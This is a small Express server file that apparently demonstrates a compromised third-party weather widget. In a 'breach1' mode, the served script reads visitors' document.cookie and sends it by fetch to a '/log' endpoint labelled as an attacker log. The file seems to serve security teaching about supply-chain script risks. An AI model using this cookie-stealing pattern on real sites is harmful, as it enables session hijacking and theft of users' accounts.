const express = require("express");
const cors = require("cors");
const path = require("path");

const app = express();
app.use(cors());

const modeIndex = process.argv.indexOf("--mode");
const mode = modeIndex !== -1 ? process.argv[modeIndex + 1] : "normal";

// WEATHER SCRIPT
app.get("/weather-widget.js", (req, res) => {
    res.type("application/javascript");

    res.send(`
        document.addEventListener("DOMContentLoaded", function() {

            const MODE = "${mode}";

            if (MODE === "breach1") {

                const stolenCookie = document.cookie;

                fetch("http://localhost:5000/log?data=" + stolenCookie);

                console.log("Cookie stolen!");

            } else {

                console.log("Current temperature: 5°C");

            }
        });
    `);
});

// ATTACKER LOG
app.get("/log", (req, res) => {
    console.log("STOLEN COOKIE:", req.query.data);
    res.send("ok");
});

app.use(express.static(path.join(__dirname)));

app.listen(5000, () => {
    console.log(`WeatherApp running on http://localhost:5000 in mode: ${mode}`);
});